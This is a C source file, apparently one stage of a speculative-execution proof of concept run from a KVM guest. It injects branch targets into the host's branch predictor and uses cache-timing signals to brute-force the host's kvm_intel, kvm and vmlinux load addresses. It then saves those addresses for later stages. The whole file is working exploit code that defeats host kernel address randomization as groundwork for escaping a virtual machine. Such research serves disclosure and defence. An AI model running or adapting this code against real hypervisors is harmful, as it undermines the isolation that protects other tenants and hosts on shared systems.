#include "common.h"

char leak_buf[0x5000];
#define leak_ptr (leak_buf+0x2000)
#define leak_ptr_b (leak_buf+0x3000)
#define leak_ptr_obfuscated (leak_buf+(0x2000-0x1337))

#define USER_BASE          0x0000100000000000UL
#define HYPER_BASE         0xffffffff00000000UL
#define HYPER_DOWN(x) ((x) - HYPER_BASE + USER_BASE)
#define MODULE_RANGE_START 0xffffffffc0000000UL
#define MODULE_RANGE_END   0xffffffffc4000000UL /* DO NOT ADJUST WITHOUT FIXING UP THE ALIASING CODE! */
#define MODULE_RANGE_STEP  0x1000UL
#define KERNEL_RANGE_START 0xffffffff81000000UL
#define KERNEL_RANGE_END   0xffffffffc0000000UL
#define KERNEL_RANGE_STEP  0x200000UL

void nop_fn(void);
asm (
  "nop_fn:\n\t"
  ".rept 30\n\t"
  "nop\n\t"
  ".endr\n\t"
  "ret\n\t"
);

/* This code is never executed architecturally.
 * It is speculatively executed as a mispredicted jump target.
 * The misprediction is caused by host->guest BTB interference
 * in the generic BTB (to which indirect call prediction falls
 * back when the BHB state is unknown, causing the lookup against
 * the specialized indirect call BTB to fail).
 * To signal that this code was executed speculatively, a flushed
 * address is dereferenced.
 * To allow the caller to efficiently determine which copy of this
 * code was executed, dereference either rsi+0x1337 or rsi+0x2337
 * depending on a caller-selected bit inside a per-instance number.
 */
void signal_code(void);
void signal_code__aligned(void);
void signal_code__post_instancenum(void);
void signal_code__end(void);
asm (
  "signal_code:\n\t"
  "ud2\n\t"
  "signal_code__aligned:\n\t"
  "mov %rdx, %rcx\n\t"
  "mov $0x42000000, %rax\n\t" /* per-instance number; may be fixed up */
  "signal_code__post_instancenum:\n\t"
  "shr %cl, %rax\n\t"
  "and $0x1000, %rax\n\t"
  "add %rax, %rsi\n\t"
  "mov 0x1337(%rsi), %rsi\n\t"
  "ret\n\t"
  "signal_code__end:\n\t"
);

void jmp_code(void);
void jmp_code__unpadded(void);
void jmp_code__end(void);
asm (
  "jmp_code:\n\t"

  /* The *end* of the call instruction has to be aligned with the targeted one.
   * When the targeted instruction is 6 bytes long (with immediate offset), pad
   * the following 2-byte call instruction with 4 more bytes to fix the alignment.
   */
  ".rept 4\n\t"
  "nop\n\t"
  ".endr\n\t"

  "jmp_code__unpadded:\n\t"
  "call *(%rdi)\n\t"
  "ret\n\t"
  "jmp_code__end:\n\t"
);

void *fnp_area[0x2000];

int main(int argc, char **argv) {
  printf("%s === starting hyper_btb_brute ===\n", cur_time());
  common_init();
  hot_cold_init();
  printf("%s kvm_intel_load_address = 0x%05lx\n", cur_time(), kvm_intel_load_address);
  *leak_ptr = 1;
  *leak_ptr_b = 1;
  fnp_area[0x1000] = nop_fn;
  pipeline_flush();

  if (iopl(3))
    err(1, "iopl");

  if (mmap((void*)HYPER_DOWN(MODULE_RANGE_START), MODULE_RANGE_END - MODULE_RANGE_START,
          PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0)
          != (void*)HYPER_DOWN(MODULE_RANGE_START))
    err(1, "mmap module_range");

  for (unsigned long addr = MODULE_RANGE_START + kvm_intel_load_address + INDIR_CALL_DEST_OFFSET; addr < MODULE_RANGE_END;
          addr += 0x100000) {
    memcpy((void*)HYPER_DOWN(addr) - ((unsigned long)signal_code__aligned - (unsigned long)signal_code), signal_code, (unsigned long)signal_code__end - (unsigned long)signal_code);
  }

  for (unsigned long addr = MODULE_RANGE_START + INDIR_CALL_SOURCE_OFFSET; addr < MODULE_RANGE_END; addr += 0x1000) {
    memcpy((void*)HYPER_DOWN(addr), jmp_code, (unsigned long)jmp_code__end - (unsigned long)jmp_code);
  }


  uint64_t results_a[(MODULE_RANGE_END-MODULE_RANGE_START)/MODULE_RANGE_STEP] = {0};
  int total_results = 0;
  for (int iteration = 0; 1; iteration++) {
    for (unsigned long src_addr = MODULE_RANGE_START + INDIR_CALL_SOURCE_OFFSET; src_addr < MODULE_RANGE_END; src_addr += MODULE_RANGE_STEP) {
      if (has_alias_in_range(src_addr, MODULE_RANGE_START + INDIR_CALL_SOURCE_OFFSET, src_addr))
        continue;
      pipeline_flush();
      for (int i=0; i<10; i++) {
        clflush(fnp_area+0x1000);
        clflush(leak_ptr);
        pipeline_flush();

        asm volatile("mov $0, %%rax\n\tvmcall":::"rax");
        asm volatile("mov $0, %%rax\n\tvmcall":::"rax");
        CRAPPY_BHB_RANDOMIZE

        ((void(*)(void *, void *, unsigned long))HYPER_DOWN(src_addr))(fnp_area+0x1000, leak_ptr_obfuscated, 0);
        pipeline_flush();
        if (is_hot(leak_ptr)) {
          results_a[(src_addr-INDIR_CALL_SOURCE_OFFSET-MODULE_RANGE_START)/MODULE_RANGE_STEP]++;
          total_results++;
          printf("\r%s got %d/1000 hits for kvm->kvm_intel in %d iterations", cur_time(), total_results, iteration);
          if (total_results == 1000)
            goto end_of_scan;
        }
        pipeline_flush();
      }
    }
  }
end_of_scan:;
  printf("\n");
  printf("%s result dump (WITH WONKY ALIASING, NOT REAL ADDRESSES):\n", cur_time());
  unsigned long kvm_call_address_aliased = 0;
  for (unsigned long addr = MODULE_RANGE_START; addr < MODULE_RANGE_END; addr += MODULE_RANGE_STEP) {
    unsigned long i = (addr-MODULE_RANGE_START)/MODULE_RANGE_STEP;
    if (results_a[i] >= 20) {
      printf("%s   0x%lx %lu\n", cur_time(), addr, results_a[i]);
    }
    if (results_a[i] >= 300) {
      if (kvm_call_address_aliased)
        err(1, "multiple results from kvm->kvm_intel scan");
      kvm_call_address_aliased = addr + INDIR_CALL_SOURCE_OFFSET;
    }
  }
  if (!kvm_call_address_aliased)
    err(1, "no good result for kvm->kvm_intel scan");
  printf("%s indirect call source for kvm->kvm_intel is at 0x%lx or alias\n", cur_time(), kvm_call_address_aliased);

  munmap((void*)HYPER_DOWN(MODULE_RANGE_START), MODULE_RANGE_END - MODULE_RANGE_START);



  for (unsigned long alias_i = 0; alias_i < 0x10; alias_i++) {
    unsigned long kvm_call_address_candidate = kvm_call_address_aliased ^ (alias_i<<13) ^ (alias_i<<22);
    unsigned long kvm_address_candidate = kvm_call_address_candidate - INDIR_CALL_SOURCE_OFFSET;
    unsigned long vcpu_ioctl_candidate = kvm_address_candidate + VCPU_IOCTL_OFFSET;
    if (vcpu_ioctl_candidate > MODULE_RANGE_END) {
      continue;
    }
    unsigned long vcpu_ioctl_candidate_page = vcpu_ioctl_candidate & ~0xfffUL;
    if (mmap((void*)HYPER_DOWN(vcpu_ioctl_candidate_page), 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
          != (void*)HYPER_DOWN(vcpu_ioctl_candidate_page))
      err(1, "mmap vcpu_ioctl_candidate_page");
    memcpy((void*)HYPER_DOWN(vcpu_ioctl_candidate) - ((unsigned long)signal_code__aligned - (unsigned long)signal_code), signal_code, (unsigned long)signal_code__end - (unsigned long)signal_code);
    *(uint32_t*)(HYPER_DOWN(vcpu_ioctl_candidate) + ((unsigned long)signal_code__post_instancenum - (unsigned long)signal_code__aligned) - 4) = alias_i * 0x2000;
  }

  for (unsigned long kernel_base = KERNEL_RANGE_START; kernel_base < KERNEL_RANGE_END; kernel_base += KERNEL_RANGE_STEP) {
    unsigned long vcpu_ioctl_caller_candidate = kernel_base + VCPU_IOCTL_CALLER_OFFSET;
    unsigned long vcpu_ioctl_caller_candidate_page = vcpu_ioctl_caller_candidate & ~0xfffUL;
    if (mmap((void*)HYPER_DOWN(vcpu_ioctl_caller_candidate_page), 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
          != (void*)HYPER_DOWN(vcpu_ioctl_caller_candidate_page))
      err(1, "mmap vcpu_ioctl_caller_candidate_page");
    memcpy((void*)HYPER_DOWN(vcpu_ioctl_caller_candidate), jmp_code__unpadded, (unsigned long)jmp_code__end - (unsigned long)jmp_code__unpadded);
  }

  uint64_t results_b[(KERNEL_RANGE_END-KERNEL_RANGE_START)/KERNEL_RANGE_STEP] = {0};
  int total_results_b = 0;
  for (int iteration = 0; 1; iteration++) {
    for (unsigned long src_addr = KERNEL_RANGE_START + VCPU_IOCTL_CALLER_OFFSET; src_addr < KERNEL_RANGE_END; src_addr += KERNEL_RANGE_STEP) {
      pipeline_flush();
      for (int i=0; i<10; i++) {
        clflush(fnp_area+0x1000);
        clflush(leak_ptr);
        pipeline_flush();

        TRIP_THROUGH_QEMU
        TRIP_THROUGH_QEMU
        CRAPPY_BHB_RANDOMIZE

        ((void(*)(void *, void *, unsigned long))HYPER_DOWN(src_addr))(fnp_area+0x1000, leak_ptr_obfuscated, 0);
        pipeline_flush();
        if (is_hot(leak_ptr)) {
          results_b[(src_addr-VCPU_IOCTL_CALLER_OFFSET-KERNEL_RANGE_START)/KERNEL_RANGE_STEP]++;
          total_results_b++;
          printf("\r%s got %d/1000 hits for vmlinux->kvm in %d iterations", cur_time(), total_results_b, iteration);
          if (total_results_b == 1000)
            goto end_of_scan_b;
        }
        pipeline_flush();
      }
    }
  }
end_of_scan_b:;
  printf("\n");
  printf("%s result dump:\n", cur_time());
  unsigned long kernel_base_address = 0;
  for (unsigned long addr = KERNEL_RANGE_START; addr < KERNEL_RANGE_END; addr += KERNEL_RANGE_STEP) {
    unsigned long i = (addr-KERNEL_RANGE_START)/KERNEL_RANGE_STEP;
    if (results_b[i] >= 20) {
      printf("%s   0x%lx %lu\n", cur_time(), addr, results_b[i]);
    }
    if (results_b[i] >= 300) {
      if (kernel_base_address)
        err(1, "multiple results from vmlinux->kvm scan");
      kernel_base_address = addr;
    }
  }
  if (!kernel_base_address)
    err(1, "no good result for vmlinux->kvm scan");
  printf("%s vmlinux is at 0x%lx\n", cur_time(), kernel_base_address);

  int real_alias_i = 0;
  for (int alias_bit = 1; alias_bit <= 4; alias_bit++) {
    printf("%s testing for alias bit %d\n", cur_time(), alias_bit);
    int total_results = 0;
    int votes_1 = 0;
    for (int iteration = 0; 1; iteration++) {
      pipeline_flush();
      clflush(fnp_area+0x1000);
      clflush(leak_ptr);
      clflush(leak_ptr_b);
      pipeline_flush();

      TRIP_THROUGH_QEMU
      TRIP_THROUGH_QEMU
      CRAPPY_BHB_RANDOMIZE

      unsigned long src_addr = kernel_base_address + VCPU_IOCTL_CALLER_OFFSET;
      ((void(*)(void *, void *, unsigned long))HYPER_DOWN(src_addr))(fnp_area+0x1000, leak_ptr_obfuscated, alias_bit);
      pipeline_flush();
      if (is_hot(leak_ptr)) {
        total_results++;
      }
      pipeline_flush();
      if (is_hot(leak_ptr_b)) {
        total_results++;
        votes_1++;
      }
      if (total_results == 1000)
        goto end_of_bit_scan;
      pipeline_flush();
    }
end_of_bit_scan:;
    int bit_value = (votes_1 > total_results-votes_1);
    printf("%s votes for alias bit %d: %d vs %d; bit=%d\n", cur_time(), alias_bit, total_results-votes_1, votes_1, bit_value);
    if (bit_value) real_alias_i |= (1<<(alias_bit-1));
  }
  printf("%s alias index is %d\n", cur_time(), real_alias_i);
  unsigned long real_kvm_call_address = kvm_call_address_aliased ^ (real_alias_i<<13) ^ (real_alias_i<<22);
  unsigned long real_kvm_address = real_kvm_call_address - INDIR_CALL_SOURCE_OFFSET;
  printf("%s kvm load address is 0x%lx\n", cur_time(), real_kvm_address);

  write_ulong_to_file("host_vmlinux_load_address", kernel_base_address);
  write_ulong_to_file("host_kvm_load_address", real_kvm_address);
}
